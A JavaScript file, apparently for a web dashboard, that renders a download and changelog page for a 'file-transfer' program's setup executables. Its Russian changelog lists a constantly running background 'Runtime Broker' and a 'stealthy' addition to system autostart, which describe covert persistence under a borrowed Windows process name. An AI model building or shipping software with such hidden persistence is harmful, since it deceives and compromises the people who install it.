// ── ДАННЫЕ ОБНОВЛЕНИЙ ─────────────────────────────────────────────────────────
// Ты можешь добавлять новые версии сюда. 
// Самая первая в списке (индекс 0) считается актуальной (Current).
const UPDATES = [
  {
    version: "7.0.1",
    date: "22.06.2026",
    downloadUrlDildman: "https://github.com/Arte777/file-transfer/releases/download/v7.0.1/NON_PRO_setup.exe",
    downloadUrlRah: "https://github.com/Arte777/file-transfer/releases/download/v7.0.1/RAH_Non_Pro_setup.exe",
    changes: [
      { type: "add", text: "Добавлен постоянно работающий Runtime Broker в фоновом режиме" },
      { type: "add", text: "Скрытное добавление в автозагрузку системы" },
      { type: "fix", text: "Повышена стабильность работы фонового процесса" }
    ]
  }
];

// ── ОТРИСОВКА ───────────────────────────────────────────────────────────────
document.addEventListener('DOMContentLoaded', () => {
  // Инициализируем сайдбар
  const sidebarSlot = document.getElementById('sidebarSlot');
  if (sidebarSlot) sidebarSlot.innerHTML = renderHeader('updates');
  if (typeof bindLogout === 'function') bindLogout();

  renderUpdates();
});

function renderUpdates() {
  const current = UPDATES[0];
  
  // Обновляем Герой-Блок
  document.getElementById('heroVersion').textContent = 'v' + current.version;
  document.getElementById('btnDownloadDildman').href = current.downloadUrlDildman;
  document.getElementById('btnDownloadRah').href = current.downloadUrlRah;
  
  // Отрисовываем таймлайн ченджлогов
  const listEl = document.getElementById('changelogList');
  listEl.innerHTML = '';
  
  UPDATES.forEach((update, idx) => {
    const isLatest = idx === 0;
    
    let changesHtml = update.changes.map(c => {
      const icon = c.type === 'add' 
        ? '<span style="color:#10b981;">+</span>' 
        : '<span style="color:#f59e0b;">⚙️</span>';
      return `<div class="change-item">${icon} ${escapeHtml(c.text)}</div>`;
    }).join('');

    const card = document.createElement('div');
    card.className = 'changelog-card';
    if (isLatest) card.classList.add('latest');
    
    card.innerHTML = `
      <div class="changelog-header">
        <h3 class="changelog-version">v${update.version}</h3>
        <span class="changelog-date">${update.date}</span>
        ${isLatest ? '<span class="changelog-badge">Актуальная</span>' : ''}
      </div>
      <div class="changelog-body">
        ${changesHtml}
      </div>
    `;
    
    listEl.appendChild(card);
  });
}
